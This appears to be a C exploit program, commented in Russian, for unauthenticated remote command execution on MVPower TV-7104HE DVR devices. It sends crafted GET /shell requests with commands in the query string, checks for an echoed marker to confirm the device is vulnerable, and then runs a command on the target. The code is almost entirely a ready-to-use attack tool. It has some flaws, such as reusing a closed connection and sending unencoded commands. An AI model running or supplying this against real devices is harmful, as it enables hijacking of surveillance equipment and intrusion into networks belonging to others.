// "MVPower model TV-7104HE firmware version 1.8.4 115215B9

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 4096

void send_request(int sock, const char *request) {
    send(sock, request, strlen(request), 0);
}

int check_vulnerability(int sock) {
    char buffer[BUFFER_SIZE];
    const char *mark = "RCE_CHECK_MARK";
    char cmd[BUFFER_SIZE];

    // Формирование команды для проверки уязвимости
    snprintf(cmd, sizeof(cmd), "echo %s", mark);
    char request[BUFFER_SIZE];
    snprintf(request, sizeof(request),
             "GET /shell?%s HTTP/1.1\r\n"
             "Host: target_ip\r\n"  // Замените на IP-адрес целевого устройства
             "Connection: close\r\n\r\n",
             cmd);

    // Отправка запроса
    send_request(sock, request);
    
    // Чтение ответа
    recv(sock, buffer, sizeof(buffer) - 1, 0);
    buffer[BUFFER_SIZE - 1] = '\0'; // Обеспечиваем нуль-терминатор

    // Проверка наличия маркера в ответе
    if (strstr(buffer, mark) != NULL) {
        return 1; // Уязвимость найдена
    }

    return 0; // Уязвимость не найдена
}

void execute_command(int sock, const char *cmd) {
    char buffer[BUFFER_SIZE];
    char request[BUFFER_SIZE];

    // Формирование команды
    snprintf(request, sizeof(request),
             "GET /shell?%s HTTP/1.1\r\n"
             "Host: target_ip\r\n"  // Замените на IP-адрес целевого устройства
             "Connection: close\r\n\r\n",
             cmd);

    // Отправка запроса
    send_request(sock, request);
    
    // Чтение ответа (необязательно, так как это слепая RCE)
    recv(sock, buffer, sizeof(buffer) - 1, 0);
    buffer[BUFFER_SIZE - 1] = '\0'; // Обеспечиваем нуль-терминатор
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <target_ip> <port>\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1];
    int port = atoi(argv[2]);

    int sock;
    struct sockaddr_in server_addr;

    // Создание сокета
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return EXIT_FAILURE;
    }

    // Настройка адреса сервера
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    // Подключение к серверу
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return EXIT_FAILURE;
    }

    // Проверка уязвимости
    if (check_vulnerability(sock)) {
        printf("Target seems to be vulnerable.\n");

        // Пример выполнения команды
        const char *command = "id"; // Замените на нужную команду
        execute_command(sock, command);
        printf("Command executed: %s\n", command);
    } else {
        printf("Exploit failed - target seems to be not vulnerable.\n");
    }

    // Закрытие сокета
    close(sock);
    return EXIT_SUCCESS;
}
